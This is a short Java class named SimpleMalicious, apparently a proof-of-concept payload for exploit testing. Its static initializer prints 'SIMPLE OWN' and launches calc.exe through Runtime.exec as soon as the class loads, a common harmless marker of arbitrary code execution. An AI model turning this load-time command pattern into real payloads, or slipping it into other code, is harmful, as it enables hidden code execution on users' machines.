public class SimpleMalicious{
	static {
		System.out.println("SIMPLE OWN");
		Runtime.getRuntime().exec("calc.exe").waitFor();
	}
}